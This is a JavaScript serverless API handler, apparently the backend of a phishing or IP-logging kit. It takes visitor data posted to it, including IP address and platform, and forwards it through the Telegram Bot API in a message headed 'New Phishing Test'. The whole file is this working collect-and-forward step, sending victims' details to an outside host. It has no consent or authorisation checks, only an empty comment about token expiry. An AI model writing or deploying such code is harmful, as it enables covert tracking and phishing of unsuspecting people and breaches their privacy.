export default async (req, res) => {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { telegramId, ...deviceInfo } = req.body;
    
    // Validate token expiration here (if stored in database)
    
    // Send to Telegram
    await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: telegramId,
        text: `📡 New Phishing Test\n\n` +
              `🆔 Chat ID: ${telegramId}\n` +
              `🌐 IP: ${deviceInfo.ip}\n` +
              `🖥️ Platform: ${deviceInfo.platform}\n` +
              `🕒 Time: ${new Date().toLocaleString()}`
      })
    });
    
    res.status(200).json({ success: true });
    
  } catch (error) {
    console.error('Submission error:', error);
    res.status(500).json({ error: 'Failed to send to Telegram' });
  }
};
